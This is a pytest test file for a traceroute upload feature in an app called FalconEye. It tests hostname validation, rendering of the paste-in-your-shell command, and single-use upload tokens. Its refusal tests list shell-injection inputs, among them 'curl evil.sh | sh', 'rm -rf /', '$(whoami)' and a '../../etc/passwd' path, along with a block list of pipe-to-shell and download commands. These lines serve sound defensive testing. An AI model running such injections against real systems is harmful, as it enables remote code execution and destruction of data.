"""The run-it-yourself handshake: target validation, tokens, upload, collection.

The target is interpolated into a command string a human is told to paste into
their own shell. That makes this the one place in FalconEye where user input
can become somebody else's shell command, so most of this file is about what
must be refused.
"""
import asyncio
import os
import time

import pytest

os.environ.setdefault("FALCONEYE_DB", "/tmp/falconeye_test.db")

from app.routemap import tokens


@pytest.fixture(autouse=True)
def process_store(monkeypatch):
    """Drive the in-process store, so the tests need no Redis."""
    monkeypatch.setattr(tokens, "_redis", None)
    tokens._local.clear()


# ---------- target validation ----------

@pytest.mark.parametrize("raw,expected", [
    ("example.com", "example.com"),
    ("WWW.Example.COM", "www.example.com"),
    ("a-b.example.co.uk", "a-b.example.co.uk"),
    ("122.2.187.146.static.pldt.net", "122.2.187.146.static.pldt.net"),
    ("1.1.1.1", "1.1.1.1"),
    ("2001:db8::1", "2001:db8::1"),
    ("  heise.de  ", "heise.de"),
])
def test_a_plain_target_is_accepted_and_canonicalised(raw, expected):
    assert tokens.validate_target(raw) == expected


@pytest.mark.parametrize("raw", [
    # Shell metacharacters, the whole reason this function exists.
    "example.com; curl evil.sh | sh",
    "example.com && rm -rf /",
    "example.com | sh",
    "`id`",
    "$(whoami).com",
    "ex$(curl evil).com",
    "example.com\nrm -rf /",
    "example.com\rwhoami",
    "a b.com",
    "example.com'",
    'example.com"',
    "example.com\\",
    "example.com>out",
    "example.com<in",
    "example.com&",
    # Not a bare hostname.
    "http://example.com",
    "https://example.com/path",
    "example.com/path",
    "example.com:8080",
    "user@example.com",
    "-rf",
    "--flag",
    "localhost",
    "",
    "   ",
    "a" * 300,
    # Addresses that are not traceroute targets.
    "127.0.0.1",
    "0.0.0.0",
    "224.0.0.1",
])
def test_anything_that_is_not_a_bare_hostname_is_refused(raw):
    with pytest.raises(tokens.InvalidTarget):
        tokens.validate_target(raw)


def test_the_rendered_command_cannot_be_built_from_unvalidated_input():
    """Belt and braces: render_commands re-validates rather than trusting."""
    with pytest.raises(ValueError):
        tokens.render_commands("example.com; id", "https://x/api/routemap/ingest/t")


@pytest.mark.parametrize("key", ["windows", "unix", "mtr"])
def test_every_command_only_uploads_text(key):
    """No script is downloaded and nothing is executed from this server."""
    url = "https://falconeye.example/api/routemap/ingest/" + "a" * 64
    command = next(c["command"] for c in tokens.render_commands("heise.de", url)
                   if c["key"] == key)
    assert "heise.de" in command and url in command
    for forbidden in ("| sh", "|sh", "| bash", "iex", "Invoke-Expression",
                      "curl -s https://", "wget "):
        assert forbidden.lower() not in command.lower(), (
            f"{key} command contains {forbidden!r}; it must only upload text")


def test_the_platform_hint_is_a_default_not_a_restriction():
    assert tokens.detect_platform("Mozilla/5.0 (Windows NT 10.0)") == "windows"
    assert tokens.detect_platform("Mozilla/5.0 (Macintosh)") == "unix"
    assert tokens.detect_platform("") == "unix"
    # Every platform is offered regardless of the hint.
    assert len(tokens.render_commands("heise.de", "https://x/i/t")) == 3


# ---------- tokens ----------

def test_a_token_is_single_use():
    async def _scenario():
        issued = await tokens.issue("heise.de")
        await tokens.deposit(issued["token"], "traceroute to x\n 1  1.1.1.1  1 ms\n")
        with pytest.raises(tokens.TokenError):
            await tokens.deposit(issued["token"], "a second upload\n")
    asyncio.run(_scenario())


def test_a_collected_token_cannot_be_collected_twice():
    """The trace is handed over once and then gone."""
    async def _scenario():
        issued = await tokens.issue("heise.de")
        await tokens.deposit(issued["token"], "trace text\n")
        first = await tokens.collect(issued["token"], issued["poll_key"])
        assert first["status"] == "ready"
        assert first["trace_text"] == "trace text\n"
        second = await tokens.collect(issued["token"], issued["poll_key"])
        assert second["status"] == "expired"
    asyncio.run(_scenario())


def test_an_expired_token_is_refused():
    async def _scenario():
        issued = await tokens.issue("heise.de")
        payload = await tokens._get(issued["token"])
        payload["expires_at"] = time.time() - 1
        await tokens._put(issued["token"], payload)
        with pytest.raises(tokens.TokenError):
            await tokens.deposit(issued["token"], "too late\n")
    asyncio.run(_scenario())


def test_an_unknown_token_is_refused_the_same_way_an_expired_one_is():
    """Otherwise the endpoint is an oracle for which tokens exist."""
    async def _scenario():
        issued = await tokens.issue("heise.de")
        await tokens.deposit(issued["token"], "trace\n")
        unknown = "f" * 64
        try:
            await tokens.deposit(unknown, "x")
            raise AssertionError("an unknown token was accepted")
        except tokens.TokenError as exc:
            unknown_message = str(exc)
        try:
            await tokens.deposit(issued["token"], "x")
            raise AssertionError("a used token was accepted")
        except tokens.TokenError as exc:
            used_message = str(exc)
        assert unknown_message == used_message
    asyncio.run(_scenario())


@pytest.mark.parametrize("bad", ["", "short", "zz" * 32, "../../etc/passwd",
                                 "A" * 64, "a" * 63, "a" * 65])
def test_a_malformed_token_never_reaches_the_store(bad):
    async def _scenario():
        with pytest.raises(tokens.TokenError):
            await tokens.deposit(bad, "x")
    asyncio.run(_scenario())


def test_collection_requires_the_poll_key_the_page_kept():
    """The session binding: only the browser that asked may read the result."""
    async def _scenario():
        issued = await tokens.issue("heise.de")
        await tokens.deposit(issued["token"], "trace\n")
        with pytest.raises(tokens.TokenError):
            await tokens.collect(issued["token"], "not-the-key")
        # The real key still works afterwards: a wrong guess must not burn it.
        got = await tokens.collect(issued["token"], issued["poll_key"])
        assert got["status"] == "ready"
    asyncio.run(_scenario())


def test_waiting_is_reported_before_anything_is_uploaded():
    async def _scenario():
        issued = await tokens.issue("heise.de")
        state = await tokens.collect(issued["token"], issued["poll_key"])
        assert state["status"] == "waiting"
        assert state["target"] == "heise.de"
    asyncio.run(_scenario())


def test_tokens_and_poll_keys_are_unguessable_and_distinct():
    async def _scenario():
        a = await tokens.issue("heise.de")
        b = await tokens.issue("heise.de")
        assert a["token"] != b["token"]
        assert a["poll_key"] != b["poll_key"]
        assert a["token"] != a["poll_key"]
        assert len(a["token"]) == tokens.TOKEN_BYTES * 2
        assert len(a["poll_key"]) == tokens.POLL_KEY_BYTES * 2
    asyncio.run(_scenario())
